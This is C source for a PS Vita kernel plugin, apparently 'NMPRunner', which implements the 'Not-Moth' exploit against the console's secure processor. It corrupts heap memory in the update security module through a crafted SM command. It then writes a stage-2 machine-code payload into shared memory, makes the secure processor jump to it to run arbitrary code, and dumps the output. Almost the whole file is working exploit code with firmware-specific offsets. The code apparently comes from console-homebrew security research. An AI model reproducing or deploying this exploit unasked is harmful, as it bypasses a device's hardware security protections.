
/* 
	NMPRunner by SKGleba
	All Rights Reserved
*/

#include <stdio.h>
#include <string.h>
#include <taihen.h>
#include <psp2kern/kernel/modulemgr.h>
#include <vitasdkkern.h>
#include "not-moth.h"

#define LOG_LOC "ux0:data/NMPRunner.log"

int ctx = -1;
int dclog = 1;
uint8_t idk[0xFF0];
uint32_t cpybuf[64/4];
cmd_0x50002_t cargs;
SceSblSmCommPair stop_res;
static int (* load_ussm)() = NULL;

/*
	Stage 2 payload for Not-Moth:
	 - execute code @0x1C010100
	 - clean r0
	 - jmp back to update_sm's 0xd0002
	On 3.60 - 3.70 byte[14] = 0x26
	On 3.71 - 3.73 byte[14] = 0x8c
*/
unsigned char stage2_payload[] = 
{
	0x21, 0xc0, 0x01, 0x1c,	// movh r0, 0x1C01
	0x04, 0xc0, 0x00, 0x01,	// or3 r0, r0, 0x100
	0x0f, 0x10,				// jsr r0
	0x21, 0xc0, 0x00, 0x00,	// movh r0, 0x0
	0x26, 0xd3, 0xbd, 0x80,	// movu r3, 0x80bd26	(0x80bd8c on .71)
	0x3e, 0x10				// jmp r3
};

/*
	woold(mode, fw)
	commem operations
	ARG 1 (int):
		modes:
			0) memset the commem
			1) dump commem
			2) copy the stage2 payload, user code and input data to commem
	ARG 2 (int):
		- current firmware version
*/
static void woold(int mode, int fw) {
	SceKernelAllocMemBlockKernelOpt optp;
	void *corridor = NULL;
	int uid, fd;
	optp.size = 0x58;
	optp.attr = 2;
	optp.paddr = 0x1C000000;
	uid = ksceKernelAllocMemBlock("sram_cam", 0x10208006, 0x200000, &optp);
	ksceKernelGetMemBlockBase(uid, (void**)&corridor);
	if (mode == 0) {
		memset(corridor, 0, 0x1FE000);
	} else if (mode == 1) {
		LOG("dumping output...");
		fd = ksceIoOpen("ux0:data/NMPOutput_0x1C000000_0x1C1FE000.bin", SCE_O_WRONLY | SCE_O_TRUNC | SCE_O_CREAT, 6);
		ksceIoWrite(fd, corridor, 0x1FE000);
		ksceIoClose(fd);
		LOG("OK!\n");
	} else if (mode == 3) {
		if (fw >= 0x03600000 && fw < 0x03710000) {
			stage2_payload[14] = 0x26;
		} else if (fw >= 0x03710000 && fw < 0x03740000) {
			stage2_payload[14] = 0x8c;
		}
		memcpy((corridor + 0x10000), &stage2_payload, sizeof(stage2_payload));
		SceIoStat stat;
		int stat_ret = ksceIoGetstat("ux0:data/payload.nmp", &stat);
		if(stat_ret < 0){
			LOG("woold_fopread_err ux0:data/payload.nmp\n");
		} else {
			fd = ksceIoOpen("ux0:data/payload.nmp", SCE_O_RDONLY, 0);
			ksceIoRead(fd, (corridor + 0x10100), stat.st_size);
			ksceIoClose(fd);
		}
		stat_ret = ksceIoGetstat("ux0:data/NMPInput.bin", &stat);
		if(stat_ret < 0 || stat.st_size > 0xFE000){
			LOG("woold_fopread_err ux0:data/NMPInput.bin\n");
		} else {
			fd = ksceIoOpen("ux0:data/NMPInput.bin", SCE_O_RDONLY, 0);
			ksceIoRead(fd, (corridor + 0x100000), stat.st_size);
			ksceIoClose(fd);
		}
	}
	ksceKernelFreeMemBlock(uid);
}

/*
	corrupt(addr)
	Writes (uint32_t)0x2000 to (p)addr.
	ARG 1 (uint32_t):
		- paddr to write to
*/
static int corrupt(uint32_t addr) {
	LOG("corrupting 0x%lX for 0x%X... ", addr, ctx);
	int ret = 0, sm_ret = 0;
	memset(&cargs, 0, sizeof(cargs));
	cargs.use_lv2_mode_0 = cargs.use_lv2_mode_1 = 0;
	cargs.list_count = 3;
	cargs.total_count = 1;
	cargs.list.lv1[0].addr = cargs.list.lv1[1].addr = 0x50000000;
	cargs.list.lv1[0].length = cargs.list.lv1[1].length = 0x10;
	cargs.list.lv1[2].addr = 0;
	cargs.list.lv1[2].length = addr - offsetof(heap_hdr_t, next);
	LOG("calling 0x50002... ");
	ret = ksceSblSmCommCallFunc(ctx, 0x50002, &sm_ret, &cargs, sizeof(cargs));
	if (sm_ret < 0) {
		LOG("SM ret=0x%X\n", sm_ret);
    	return sm_ret;
	}
	LOG("end ret=0x%X\n", ret);
	return ret;
}

/*
	exploit_init(fw)
	Converts update_sm's 0xd0002 function.
	ARG 1 (int):
		- current firmware version
*/
static void exploit_init(int fw) {
	int ret = -1, sm_ret = -1;
	tai_module_info_t info;			
	info.size = sizeof(info);		
	LOG("getting mod info for SceSblUpdateMgr... ");
	if (taiGetModuleInfoForKernel(KERNEL_PID, "SceSblUpdateMgr", &info) >= 0) {
		LOG("git gud\n");
		module_get_offset(KERNEL_PID, info.modid, 0, 0x51a9, &load_ussm); 
		LOG("calling sm load... ");
		ret = load_ussm(0, &ctx, 0);
		LOG("ctx 0x%X ", ctx);
		if (ret == 0) {
			LOG("git gud\n");
			if (fw >= 0x03600000 && fw < 0x03710000) {
				CORRUPT_RANGE(0x0080bd10, 0x0080bd20);
			} else if (fw >= 0x03710000 && fw < 0x03740000) {
				corrupt(0x0080bd7c);
			}
		} else {
			LOG("NG; ret=0x%X\n", ret);
		}
	} else {
		LOG("NG\n");
	}
}

/*
	f00d_jump(paddr, fw)
	Makes f00d jump to paddr, assuming that 0xd0002 is converted.
	ARG 1 (uint32_t):
		- paddr to jump to
	ARG 2 (int):
		- current firmware version
*/
void f00d_jump(uint32_t paddr, int fw) {
	LOG("jmping to: 0x%lX, ctx: 0x%X... ", paddr, ctx);
	uint32_t jpaddr = paddr;
	int ret = -1, sm_ret = -1;
	uint32_t req[16];
	if (fw >= 0x03710000 && fw < 0x03740000) {
		LOG("cpying 0x%lX to: 0x818228, ctx: 0x%X... ", paddr, ctx);
    	int xret = -1, xsm_ret = -1;
		memset(&cpybuf, 0, sizeof(cpybuf));
		cpybuf[0] = 1;
		cpybuf[1] = 1;
		cpybuf[2] = paddr;
		cpybuf[3] = paddr;
		cpybuf[4] = paddr;
    	xret = ksceSblSmCommCallFunc(ctx, 0xd0002, &xsm_ret, &cpybuf, sizeof(cpybuf));
    	LOG("ret: 0x%X, SM: 0x%X\n", xret, xsm_ret);
    	jpaddr = 5414;
	}
	memset(&req, 0, sizeof(req));
	req[0] = jpaddr;
    ret = ksceSblSmCommCallFunc(ctx, 0xd0002, &sm_ret, &req, sizeof(req));
    LOG("ret: 0x%X, SM: 0x%X\n", ret, sm_ret);
}

void _start() __attribute__ ((weak, alias ("module_start")));
int module_start(SceSize argc, const void *args)
{
	LOG_START("not-moth started!\n");
	int sysroot = ksceKernelGetSysbase();
	uint32_t fw = *(uint32_t *)(*(int *)(sysroot + 0x6c) + 4);
	LOG("fw: 0x%lX\n", fw);
	
	// memset the memarea used for comm
	woold(0, fw);
	
	// read the payloads & input data to commem
	woold(3, fw);
	
	// corrupt-convert update_sm's 0xd0002
	exploit_init(fw);
	
	// make f00d jump to stage2 payload in commem
	f00d_jump((uint32_t)0x1C010000, fw);
	
	// stop the update sm
	ksceSblSmCommStopSm(ctx, &stop_res);
	
	// dump commem
	woold(1, fw);
	
	LOG("not-moth finished!\n");
	return SCE_KERNEL_START_SUCCESS;
}

int module_stop(SceSize argc, const void *args)
{
	return SCE_KERNEL_STOP_SUCCESS;
}
